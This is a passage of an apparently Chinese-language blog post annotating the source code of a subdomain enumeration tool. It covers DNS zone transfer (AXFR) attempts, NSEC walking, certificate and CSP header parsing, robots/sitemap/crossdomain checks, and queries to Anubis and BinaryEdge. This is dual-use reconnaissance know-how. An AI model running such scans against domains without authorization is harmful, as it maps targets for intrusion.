class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 入口相同，此处只分析class AXFR</span><br><span class="hljs-comment"># class AXFR</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AXFR</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-comment"># 初始化内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;AXFRCheck&#x27;</span><br>        self.results = []<br><br>        <br>    <span class="hljs-comment"># </span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">axfr</span>(<span class="hljs-params">self, server</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Perform domain transfer</span><br><span class="hljs-string">        执行域转移</span><br><span class="hljs-string">        :param server: domain server</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Trying to perform domain transfer in <span class="hljs-subst">&#123;server&#125;</span> &#x27;</span><br>                            <span class="hljs-string">f&#x27;of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># 该部分不清楚</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># server表示的是传入的ns记录</span><br>            xfr = dns.query.xfr(where=server, zone=self.domain,<br>                                timeout=<span class="hljs-number">5.0</span>, lifetime=<span class="hljs-number">10.0</span>)<br>            <span class="hljs-comment"># 将分区传输生成器的输出转换为分区对象</span><br>            zone = dns.zone.from_xfr(xfr)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, e.args)<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Domain transfer to server <span class="hljs-subst">&#123;server&#125;</span> of &#x27;</span><br>                                <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span> failed&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 此处应当是获取具体内容</span><br>        names = zone.nodes.keys()<br>        <br>        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names:<br>            <span class="hljs-comment"># 添加内容到subdomain中</span><br>            full_domain = <span class="hljs-built_in">str</span>(name) + <span class="hljs-string">&#x27;.&#x27;</span> + self.domain<br>            subdomain = self.match_subdomains(full_domain)<br>            self.subdomains.update(subdomain)<br>            record = zone[name].to_text(name)<br>            self.results.append(record)<br>        <span class="hljs-keyword">if</span> self.results:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Found the domain transfer record of &#x27;</span><br>                                <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span> on <span class="hljs-subst">&#123;server&#125;</span>&#x27;</span>)<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(self.results))<br>            self.results = []<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        check</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 设置Resolver内容并返回对象</span><br>        resolver = utils.dns_resolver()<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 查询ns信息 ns记录:指定该域名由哪个DNS服务器来进行解析。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录</span><br>            answers = resolver.query(self.domain, <span class="hljs-string">&quot;NS&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 将获取的内容逐个转为字符类型并形成列表</span><br>        nsservers = [<span class="hljs-built_in">str</span>(answer) <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(nsservers):<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;No name server record found for <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 如果存在则进行下一步</span><br>        <span class="hljs-keyword">for</span> nsserver <span class="hljs-keyword">in</span> nsservers:<br>            self.axfr(nsserver)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        类执行入口</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.begin()<br>        <span class="hljs-comment"># 跟进分析 </span><br>        self.check()<br>        self.finish()<br>        self.save_json()<br>        self.gen_result()<br>        self.save_db()<br></code></pre></div></td></tr></table></figure><h2 id="2-2-cdx"><a href="#2-2-cdx" class="headerlink" title="2.2 cdx"></a>2.2 cdx</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># crossdomain</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CrossDomain</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&quot;CrossDomainCheck&quot;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        检查crossdomain.xml收集子域名</span><br><span class="hljs-string">        crossdomain是一个可能存在的路径，访问获取即可</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        filenames = &#123;<span class="hljs-string">&#x27;crossdomain.xml&#x27;</span>&#125;<br>        <span class="hljs-comment"># 跟进函数</span><br>        self.to_check(filenames)<br></code></pre></div></td></tr></table></figure><h3 id="2-2-1-to-check和check-loop"><a href="#2-2-1-to-check和check-loop" class="headerlink" title="2.2.1 to_check和check_loop"></a>2.2.1 to_check和check_loop</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_check</span>(<span class="hljs-params">self, filenames</span>):</span><br>    <span class="hljs-comment"># 分为加www和不加的检查</span><br>    urls = <span class="hljs-built_in">set</span>()<br>    urls_www = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:<br>        urls.update((<br>            <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;self.domain&#125;</span>/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">f&#x27;https://<span class="hljs-subst">&#123;self.domain&#125;</span>/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>,<br>        ))<br>        urls_www.update((<br>            <span class="hljs-string">f&#x27;http://www.<span class="hljs-subst">&#123;self.domain&#125;</span>/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">f&#x27;https://www.<span class="hljs-subst">&#123;self.domain&#125;</span>/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        ))<br>    <span class="hljs-comment"># 跟进函数 将内容获取后获取界面中的子域名</span><br>    self.check_loop(urls)<br>    self.check_loop(urls_www)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_loop</span>(<span class="hljs-params">self, urls</span>):</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        <span class="hljs-keyword">try</span>:<br>            resp = self.get(url, check=<span class="hljs-literal">False</span>, ignore=<span class="hljs-literal">True</span>, raise_error=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">except</span> requests.exceptions.ConnectTimeout:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Connection to <span class="hljs-subst">&#123;url&#125;</span> timed out, so break check&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 获取子域名加入subdomain中</span><br>        self.subdomains = self.collect_subdomains(resp)<br>        <span class="hljs-keyword">if</span> self.subdomains:<br>            <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="2-3-cert"><a href="#2-3-cert" class="headerlink" title="2.3 cert"></a>2.3 cert</h2><p>检查域名证书收集子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># class CertInfo</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CertInfo</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CertInfo&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取域名证书并匹配证书中的子域名</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 自动加载系统的受信任CA证书并使用安全设置</span><br>            ctx = ssl.create_default_context()<br>            <span class="hljs-comment"># 创建一个socket</span><br>            sock = socket.socket()<br>            <span class="hljs-comment"># 设置超时时间</span><br>            sock.settimeout(<span class="hljs-number">10</span>)<br>            <span class="hljs-comment"># 返回一个实例的ssl.SSLSocket</span><br>            wrap_sock = ctx.wrap_socket(sock, server_hostname=self.domain)<br>            <span class="hljs-comment"># 连接具体的域名</span><br>            wrap_sock.connect((self.domain, <span class="hljs-number">443</span>))<br>            <span class="hljs-comment"># 获取证书信息</span><br>            cert_dict = wrap_sock.getpeercert()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, e.args)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 获取证书中的子域名信息</span><br>        subdomains = self.match_subdomains(<span class="hljs-built_in">str</span>(cert_dict))<br>        <span class="hljs-comment"># 更新子域名</span><br>        self.subdomains.update(subdomains)<br></code></pre></div></td></tr></table></figure><h2 id="2-4-csp"><a href="#2-4-csp" class="headerlink" title="2.4 csp"></a>2.4 csp</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CSP</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Collect subdomains from ContentSecurityPolicy</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 初始化内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain, header</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CSPCheck&#x27;</span><br>        self.csp_header = header<br>        <br>    <span class="hljs-comment"># 修饰方法，是方法可以像属性一样访问</span><br><span class="hljs-meta">    @property</span><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">grab_header</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Get header</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :return: ContentSecurityPolicy header</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        csp_header = <span class="hljs-built_in">dict</span>()<br>        urls = [<span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>,<br>                <span class="hljs-string">f&#x27;https://<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>]<br>        urls_www = [<span class="hljs-string">f&#x27;http://www.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>,<br>                    <span class="hljs-string">f&#x27;https://www.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>]<br>        header = self.grab_loop(csp_header, urls)<br>        <span class="hljs-keyword">if</span> header:<br>            <span class="hljs-keyword">return</span> header<br>        header = self.grab_loop(csp_header, urls_www)<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">grab_loop</span>(<span class="hljs-params">self, csp_header, urls</span>):</span><br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            <span class="hljs-keyword">try</span>:<br>                response = self.get(url, check=<span class="hljs-literal">False</span>, ignore=<span class="hljs-literal">True</span>, raise_error=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">except</span> requests.exceptions.ConnectTimeout:<br>                logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Connection to <span class="hljs-subst">&#123;url&#125;</span> timed out, so break check&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response:<br>                <span class="hljs-keyword">return</span> response.headers<br>        <span class="hljs-keyword">return</span> csp_header<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        正则匹配响应头中的内容安全策略字段以发现子域名</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 如果csp_header不存在</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.csp_header:<br>            <span class="hljs-comment"># 跟进函数 得到返回的header</span><br>            self.csp_header = self.grab_header<br>        <span class="hljs-comment"># 获得对应的内容</span><br>        csp = self.csp_header.get(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.csp_header:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Failed to get header of <span class="hljs-subst">&#123;self.domain&#125;</span> domain&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> csp:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;There is no Content-Security-Policy in the header &#x27;</span><br>                                <span class="hljs-string">f&#x27;of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 获取内容中的域名并更新</span><br>        self.subdomains = self.match_subdomains(csp)<br></code></pre></div></td></tr></table></figure><h2 id="2-5-nsec"><a href="#2-5-nsec" class="headerlink" title="2.5 nsec"></a>2.5 nsec</h2><p>该函数没有实际操作成功，代码流程能够理解，当时实际内容不清楚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NSEC</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&quot;NSECCheck&quot;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">walk</span>(<span class="hljs-params">self</span>):</span><br>        domain = self.domain<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 返回查询结果尝试qq.com,baidu.com后都没正确的返回</span><br>            answer = utils.dns_query(domain, <span class="hljs-string">&#x27;NSEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> answer <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">break</span><br>            subdomain = <span class="hljs-built_in">str</span>()<br>            <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> answer:<br>                record = item.to_text()<br>                subdomains = self.match_subdomains(record)<br>                subdomain = <span class="hljs-string">&#x27;&#x27;</span>.join(subdomains)  <span class="hljs-comment"># 其实这里的subdomains的长度为1 也就是说只会有一个子域</span><br>                self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> subdomain == self.domain:  <span class="hljs-comment"># 当查出子域为主域 说明完成了一个循环 不再继续查询</span><br>                <span class="hljs-keyword">break</span><br>            domain = subdomain<br>        <span class="hljs-keyword">return</span> self.subdomains<br></code></pre></div></td></tr></table></figure><h2 id="2-6-robots"><a href="#2-6-robots" class="headerlink" title="2.6 robots"></a>2.6 robots</h2><p>该处与之前的cdx类似，同样就是访问常存在的文件获取子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Robots</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;RobotsCheck&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        正则匹配域名的robots.txt文件中的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        filenames = &#123;<span class="hljs-string">&#x27;robots.txt&#x27;</span>&#125;<br>        self.to_check(filenames)<br></code></pre></div></td></tr></table></figure><h2 id="2-7-sitemap"><a href="#2-7-sitemap" class="headerlink" title="2.7 sitemap"></a>2.7 sitemap</h2><p>此处也是和robots，cdx类似的信息收集</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sitemap</span>(<span class="hljs-params">Check</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Check.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;check&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;SitemapCheck&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        正则匹配域名的sitemap文件中的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        filenames = &#123;<span class="hljs-string">&#x27;sitemap.xml&#x27;</span>, <span class="hljs-string">&#x27;sitemap.txt&#x27;</span>, <span class="hljs-string">&#x27;sitemap.html&#x27;</span>, <span class="hljs-string">&#x27;sitemapindex.xml&#x27;</span>&#125;<br>        self.to_check(filenames)<br></code></pre></div></td></tr></table></figure><h1 id="3-datasets"><a href="#3-datasets" class="headerlink" title="3.datasets"></a>3.datasets</h1><h2 id="3-1-anubis"><a href="#3-1-anubis" class="headerlink" title="3.1 anubis"></a>3.1 anubis</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Anubis</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-comment"># 初始化内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;AnubisQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://jldc.me/anubis/subdomains/&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        self.addr = self.addr + self.domain<br>        resp = self.get(self.addr)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-2-binaryedge-api"><a href="#3-2-binaryedge-api" class="headerlink" title="3.2 binaryedge_api"></a>3.2 binaryedge_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BinaryEdgeAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;BinaryEdgeAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.binaryedge.io/v2/query/domains/subdomain/&#x27;</span><br>        self.api = settings.binaryedge_api<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.header.update(&#123;<span class="hljs-string">&#x27;X-Key&#x27;</span>: self.api&#125;)<br>        self.proxy = self.get_proxy(self.source)<br>        url = self.addr + self.domain<br>        resp = self.get(url)<br>        self.subdomains = 